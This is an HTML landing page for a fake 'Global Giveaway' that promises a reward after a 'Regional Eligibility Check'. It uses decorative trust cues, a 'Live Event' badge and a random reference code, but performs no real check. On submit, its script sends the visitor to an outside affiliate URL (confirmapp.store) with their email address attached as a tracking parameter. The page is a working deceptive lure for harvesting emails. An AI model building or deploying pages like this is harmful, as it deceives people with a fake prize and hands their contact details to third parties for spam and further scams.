<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Rewards | 2026 Distribution</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .hero-gradient {
            background: radial-gradient(circle at top, #1e40af 0%, #0f172a 100%);
        }
    </style>
</head>
<body class="bg-slate-900 flex items-center justify-center min-h-screen p-4 font-sans text-white">

    <div class="max-w-md w-full bg-slate-800 rounded-[2.5rem] shadow-2xl border border-slate-700 overflow-hidden">
        
        <div class="hero-gradient p-10 text-center border-b border-slate-700 relative">
            <div class="absolute top-4 right-4 bg-blue-500/20 text-blue-400 px-3 py-1 rounded-full text-[10px] font-bold uppercase border border-blue-500/30 animate-pulse">
                Live Event
            </div>
            <div class="w-20 h-20 bg-white/10 backdrop-blur-md rounded-3xl mx-auto flex items-center justify-center mb-6 border border-white/20">
                <svg class="w-10 h-10 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9-3-9m-9 9a9 9 0 019-9"></path>
                </svg>
            </div>
            <h1 class="text-3xl font-black tracking-tight mb-2 uppercase">Global Giveaway</h1>
            <p class="text-blue-200/70 text-sm font-medium tracking-[0.2em]">Regional Eligibility Check</p>
        </div>

        <div class="p-8 pb-12 bg-white text-slate-900">
            <form id="lead-form" class="space-y-5">
                <div class="text-left">
                    <label class="text-[11px] font-bold text-slate-400 uppercase tracking-widest ml-1">Participant Email</label>
                    <input type="email" id="email" placeholder="e.g. user@global.com" required 
                        class="w-full mt-1 px-5 py-4 bg-slate-50 border border-slate-200 rounded-2xl focus:ring-2 focus:ring-blue-600 outline-none transition-all">
                </div>

                <button type="submit" id="submit-btn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-black py-5 rounded-2xl shadow-xl shadow-blue-200 transition-all active:scale-95 flex items-center justify-center group uppercase tracking-widest">
                    <span>Verify & Claim</span>
                </button>
            </form>

            <div class="mt-10 pt-6 border-t border-slate-100 flex items-center justify-between px-2">
                <div class="flex flex-col text-right">
                    <span class="text-[10px] text-slate-400 uppercase font-bold tracking-tighter">Reference</span>
                    <span id="ray" class="text-slate-900 font-mono text-[11px] font-bold"></span>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('ray').innerText = Math.random().toString(36).substring(2, 8).toUpperCase();

        document.getElementById('lead-form').onsubmit = function(e) {
            e.preventDefault();
            const user_ref = document.getElementById('email').value;
            const btn = document.getElementById('submit-btn');

            btn.innerHTML = 'Redirecting...';
            btn.disabled = true;

            // Direct link only (No secondary pop-up)
            const primary_redirect = "https://confirmapp.store/sl/o19lr?aff_sub5=" + encodeURIComponent(user_ref);

            // Immediate redirect
            window.location.href = primary_redirect;
        };
    </script>
</body>
</html>
